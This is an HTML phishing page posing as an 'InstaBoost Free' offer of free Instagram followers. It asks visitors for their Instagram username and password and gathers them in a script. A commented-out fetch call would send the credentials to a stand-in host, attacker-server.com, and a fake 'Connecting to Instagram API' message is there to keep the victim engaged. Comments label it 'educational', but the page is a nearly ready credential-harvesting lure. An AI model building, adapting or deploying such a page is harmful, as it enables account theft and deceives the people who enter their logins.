<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free Instagram Followers - 100% Guaranteed</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', sans-serif;
    background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .container {
    background: #fff;
    border-radius: 12px;
    padding: 40px 30px;
    width: 380px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    text-align: center;
  }
  .logo {
    font-size: 28px;
    font-weight: 700;
    background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 5px;
  }
  .subtitle {
    color: #888;
    font-size: 13px;
    margin-bottom: 25px;
  }
  .followers-box {
    background: linear-gradient(135deg, #6a11cb, #2575fc);
    color: #fff;
    border-radius: 10px;
    padding: 15px;
    margin-bottom: 25px;
  }
  .followers-box h2 { font-size: 22px; }
  .followers-box p { font-size: 12px; opacity: 0.85; margin-top: 4px; }
  .input-group {
    margin-bottom: 14px;
    position: relative;
  }
  .input-group input {
    width: 100%;
    padding: 14px 15px;
    border: 2px solid #e0e0e0;
    border-radius: 8px;
    font-size: 14px;
    transition: border 0.3s;
    outline: none;
  }
  .input-group input:focus { border-color: #833ab4; }
  .slider-group {
    margin: 20px 0;
    text-align: left;
  }
  .slider-group label {
    font-size: 13px;
    color: #555;
    font-weight: 600;
  }
  .slider-group input[type="range"] {
    width: 100%;
    margin-top: 8px;
    accent-color: #fd1d1d;
  }
  .slider-val {
    text-align: center;
    font-size: 20px;
    font-weight: 700;
    color: #fd1d1d;
    margin-top: 5px;
  }
  .btn-submit {
    width: 100%;
    padding: 14px;
    background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    transition: transform 0.2s, box-shadow 0.2s;
  }
  .btn-submit:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 25px rgba(253,29,29,0.4);
  }
  .trust-badges {
    display: flex;
    justify-content: center;
    gap: 15px;
    margin-top: 18px;
    font-size: 11px;
    color: #999;
  }
  .trust-badges span::before { content: "✔ "; color: #4caf50; }
  .warning { font-size: 10px; color: #bbb; margin-top: 15px; }
</style>
</head>
<body>

<div class="container">
  <div class="logo">InstaBoost Free</div>
  <p class="subtitle">Get Real Followers — 100% Free & Guaranteed</p>

  <div class="followers-box">
    <h2>🚀 10K Followers FREE</h2>
    <p>Limited offer • No survey • Instant delivery</p>
  </div>

  <form id="phishForm">
    <div class="input-group">
      <input type="text" id="username" placeholder="Instagram Username" required>
    </div>
    <div class="input-group">
      <input type="password" id="password" placeholder="Instagram Password" required>
    </div>

    <div class="slider-group">
      <label>Select Followers Amount:</label>
      <input type="range" id="followerSlider" min="1000" max="50000" step="1000" value="10000">
      <div class="slider-val" id="sliderVal">10,000</div>
    </div>

    <button type="submit" class="btn-submit">🔓 Get Free Followers Now</button>
  </form>

  <div class="trust-badges">
    <span>SSL Secured</span>
    <span>No Ban Risk</span>
    <span>24/7 Support</span>
  </div>
  <p class="warning">We never store your data. Verified by InstaBoost Security™</p>
</div>

<script>
  // Slider display
  const slider = document.getElementById('followerSlider');
  const sliderVal = document.getElementById('sliderVal');
  slider.addEventListener('input', () => {
    sliderVal.textContent = parseInt(slider.value).toLocaleString();
  });

  // Form capture
  document.getElementById('phishForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const creds = {
      username: document.getElementById('username').value,
      password: document.getElementById('password').value,
      followers_requested: slider.value,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent
    };

    // === EDUCATIONAL: This is where captured data would be sent ===
    // In a real attack this would POST to an attacker-controlled server:
    //
    // fetch('https://attacker-server.com/collect', {
    //   method: 'POST',
    //   headers: {'Content-Type':'application/json'},
    //   body: JSON.stringify(creds)
    // });

    console.log('[EDU] Captured credentials:', creds);

    // Fake "processing" UX to keep victim engaged
    const btn = document.querySelector('.btn-submit');
    btn.disabled = true;
    btn.textContent = '⏳ Connecting to Instagram API...';

    setTimeout(() => {
      btn.textContent = '✅ Followers are being sent!';
      btn.style.background = '#4caf50';
    }, 3000);
  });
</script>

</body>
</html>
